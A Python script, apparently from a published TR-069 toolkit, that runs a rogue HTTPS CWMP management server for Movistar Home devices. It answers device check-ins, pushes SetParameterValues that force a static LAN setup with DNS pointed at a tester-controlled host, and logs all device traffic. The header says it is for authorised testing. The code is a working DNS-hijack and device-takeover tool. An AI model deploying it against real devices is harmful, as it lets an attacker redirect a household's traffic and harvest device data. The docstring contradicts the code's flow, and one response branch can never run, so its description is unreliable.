# SANITIZED for publication. Part of the off-kernel TR-069/Troya tooling.
# Host addresses, key filenames and credentials were replaced with placeholders.
# Use only on a device you own / are authorised to test.
#!/usr/bin/env python3
"""
HTTPS CWMP ACS for the Movistar Home production paths (ports 7014/7016).
Mirrors the PROVEN one-RPC-per-envelope flow from acs_http.py.

  Inform              -> InformResponse (only)
  empty POST (hold)   -> GetParameterValues (only)
  ...Response         -> captured, session ends (204)
"""
import datetime
import os
import ssl
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 7016
BASE = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(BASE, "acs_traffic.log")
LOCK = threading.Lock()

ENVELOPE = (
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
    'xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" '
    'xmlns:xsd="http://www.w3.org/2001/XMLSchema" '
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
    'xmlns:cwmp="urn:dslforum-org:cwmp-1-0">'
    '<soapenv:Header>'
    '<cwmp:ID soapenv:mustUnderstand="1">{hold_id}</cwmp:ID>'
    '</soapenv:Header>'
    '<soapenv:Body>{body}</soapenv:Body>'
    '</soapenv:Envelope>'
)

INFORM_RESPONSE = '<cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse>'

SET_PARAM_VALUES = (
    '<cwmp:SetParameterValues>'
    '<ParameterList soapenc:arrayType="cwmp:ParameterValueStruct[5]">'
    '<ParameterValueStruct><Name>Device.LAN.AddressingType</Name>'
    '<Value xsi:type="xsd:string">static</Value></ParameterValueStruct>'
    '<ParameterValueStruct><Name>Device.LAN.IPAddress</Name>'
    '<Value xsi:type="xsd:string"><device></Value></ParameterValueStruct>'
    '<ParameterValueStruct><Name>Device.LAN.SubnetMask</Name>'
    '<Value xsi:type="xsd:string">255.255.255.0</Value></ParameterValueStruct>'
    '<ParameterValueStruct><Name>Device.LAN.DefaultGateway</Name>'
    '<Value xsi:type="xsd:string"><gateway></Value></ParameterValueStruct>'
    '<ParameterValueStruct><Name>Device.LAN.DNSServers</Name>'
    '<Value xsi:type="xsd:string"><tester-host></Value></ParameterValueStruct>'
    '</ParameterList>'
    '<ParameterKey>mh1337dnsset</ParameterKey>'
    '</cwmp:SetParameterValues>'
)

GET_PARAM_VALUES = (
    '<cwmp:GetParameterValues>'
    '<ParameterNames soapenc:arrayType="cwmp:ParameterValueStruct[1]">'
    '<Name xsi:type="xsd:string">Device.</Name>'
    '</ParameterNames>'
    '</cwmp:GetParameterValues>'
)


def log(msg):
    line = f"[{datetime.datetime.now():%Y-%m-%d %H:%M:%S}] {msg}"
    with LOCK:
        print(line, flush=True)
        with open(LOG_FILE, "a") as f:
            f.write(line + "\n")


class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, fmt, *args):
        pass

    def _dump(self, body):
        log("=" * 60)
        log(f"REQUEST: {self.command} {self.path} from {self.client_address[0]}")
        for k, v in self.headers.items():
            log(f"  HDR {k}: {v}")
        if body:
            log(f"  BODY ({len(body)} bytes):")
            log(body.decode("utf-8", errors="replace"))
        log("=" * 60)

    def _reply(self, body_xml, hold_id="1"):
        resp = ENVELOPE.format(hold_id=hold_id, body=body_xml).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/xml")
        self.send_header("Set-Cookie", "JSESSIONID=mhac1337")
        self.send_header("Content-Length", str(len(resp)))
        self.end_headers()
        self.wfile.write(resp)

    def _hold_id(self, body_str):
        try:
            s = body_str.split("<cwmp:ID")[1].split(">")[1]
            return s.split("<")[0]
        except Exception:
            return "1"

    def do_GET(self):
        self._dump(None)
        self.send_response(200)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        self._dump(body)
        body_str = body.decode("utf-8", errors="replace")

        if "<cwmp:Inform>" in body_str:
            hold = self._hold_id(body_str)
            self._reply(INFORM_RESPONSE, hold)
            log(f">>> InformResponse only (hold {hold})")
        elif "GetParameterValuesResponse" in body_str:
            log(">>> *** PARAMETER TREE CAPTURED *** closing session.")
            self.send_response(204)
            self.send_header("Content-Length", "0")
            self.end_headers()
        elif "Response" in body_str or "Fault" in body_str:
            log(">>> got a response envelope, closing session.")
            self.send_response(204)
            self.send_header("Content-Length", "0")
            self.end_headers()
        elif "SetParameterValuesResponse" in body_str:
            log(">>> *** SETPARAM RESPONSE RECEIVED *** closing.")
            self.send_response(204)
            self.send_header("Content-Length", "0")
            self.end_headers()
        elif not body_str.strip():
            self._reply(SET_PARAM_VALUES)
            log(">>> Sent SetParameterValues (static LAN + DNS=<tester-host>)")
        else:
            self._reply(INFORM_RESPONSE)
            log(">>> unrecognized body, sent InformResponse")


if __name__ == "__main__":
    certfile = os.path.join(BASE, "acs_cert.pem")
    keyfile = os.path.join(BASE, "<acs-key.pem>")
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile, keyfile)
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    server.socket = ctx.wrap_socket(server.socket, server_side=True)
    log(f"HTTPS CWMP ACS (proven flow) listening on :{PORT}")
    server.serve_forever()